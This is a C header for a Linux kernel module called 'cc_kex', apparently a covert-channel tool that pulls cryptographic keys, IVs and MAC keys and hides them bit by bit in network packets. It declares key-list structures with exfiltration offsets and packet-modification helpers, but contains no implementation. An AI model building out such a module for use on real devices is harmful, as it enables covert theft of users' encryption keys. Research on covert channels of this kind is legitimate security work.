#pragma once

#include <linux/skbuff.h>
#include <linux/slab.h>

#define CCKEX_MODULE_NAME "cc_kex"
#define CCKEX_DRIVER_CLASS_NAME "cc_kex_driver_class"

#define CCKEX_PIXEL_BUILD 0

//	//pr_info("CCKEX_LKM [%s] ", __func__);

#define MIN(X, Y) (X < Y ? X : Y)
#define MAX(X, Y) (X > Y ? X : Y)

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// memory helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#define GET_U8H(ptr, off)        *(uint8_t *)((uint8_t*)ptr + off)
#define GET_U16H(ptr, off) ntohs(*(uint16_t*)((uint8_t*)ptr + off))
#define GET_U32H(ptr, off) ntohl(*(uint32_t*)((uint8_t*)ptr + off))
#define PAYLOAD_LENGTH(ptr, end_ptr) (size_t)((uint64_t)end_ptr - (uint64_t)ptr)

#define SET_U8H(ptr, off, val)  *(uint8_t *)((uint8_t*)ptr + off) = val
#define SET_U16H(ptr, off, val) *(uint16_t*)((uint8_t*)ptr + off) = htons(val)
#define SET_U32H(ptr, off, val) *(uint32_t*)((uint8_t*)ptr + off) = htonl(val)

uint8_t *cckex_mem_concat(uint8_t *a, size_t a_size, uint8_t *b, size_t b_size);
uint8_t *cckex_mem_concat_to_buf(uint8_t *buf, size_t buf_size, uint8_t *data, size_t data_size);

void cckex_print_mem(uint8_t *buf, size_t size);

void *cckex_memmem(const void *l, size_t l_len, const void *s, size_t s_len);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// key list helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#define CCKEX_ID_SIZE  8
#define CCKEX_KEY_SIZE 32
#define CCKEX_IV_SIZE  16
#define CCKEX_MAC_KEY_SIZE 32 

typedef struct cckex_key_list_entry {
	struct list_head list;
	uint8_t* buf;
	size_t size;

	size_t size_to_exfiltrate;

	uint32_t byte_offset;
	uint32_t bit_offset;

	uint8_t *id;
	size_t id_size;
	uint8_t *key;
	size_t key_size;
	uint8_t *iv; 
	size_t iv_size;
	uint8_t *mac_key;
	size_t mac_key_size;

	int used_to_inject_data;
	int msg_already_sent;

} cckex_key_list_entry_t;

void cckex_keylist_reset(void);

int cckex_init_output_encryption_key(void);
void cckex_set_output_encryption(int enable);
int cckex_output_encryption_enabled(void);

void cckex_keylist_add_entry(cckex_key_list_entry_t* entry);

cckex_key_list_entry_t* cckex_keylist_get_entry_by_id(uint8_t* id, size_t id_size);
cckex_key_list_entry_t* cckex_try_fetch_in_key_entry(void);
cckex_key_list_entry_t* cckex_try_fetch_cc_key_entry(void);
cckex_key_list_entry_t* cckex_try_fetch_sig_key_entry(void);

void cckex_enqueue_in_cc_out_list(cckex_key_list_entry_t *entry);
void cckex_enqueue_in_sig_out_list(cckex_key_list_entry_t *entry);

void cckex_move_in_keylist_to_out_cc_keylist(void);

uint8_t cckex_keybuf_get_bits(cckex_key_list_entry_t *entry, uint8_t count);
uint8_t cckex_keybuf_has_bits(cckex_key_list_entry_t *entry);

void cckex_free_key_list_entry(cckex_key_list_entry_t *entry);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// sk_buff helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

uint8_t* cckex_get_ptr_to_payload(struct sk_buff *skb, int ip_proto);

void cckex_update_checksums(struct sk_buff *skb);
void cckex_update_skb_lengths(struct sk_buff *skb, unsigned delta_length);

int cckex_skb_is_ipv4(struct sk_buff *skb);
int cckex_skb_is_ipv6(struct sk_buff *skb);

int cckex_skb_get_ip_proto(struct sk_buff *skb);

uint16_t cckex_skb_get_source_port(struct sk_buff *skb);
uint16_t cckex_skb_get_dest_port(struct sk_buff *skb);

int cckex_skb_tcp_fin(struct sk_buff *skb);

uint8_t* cckex_skb_get_payload(struct sk_buff *skb);

int cckex_skb_v4_dest_is_localhost(struct sk_buff *skb);
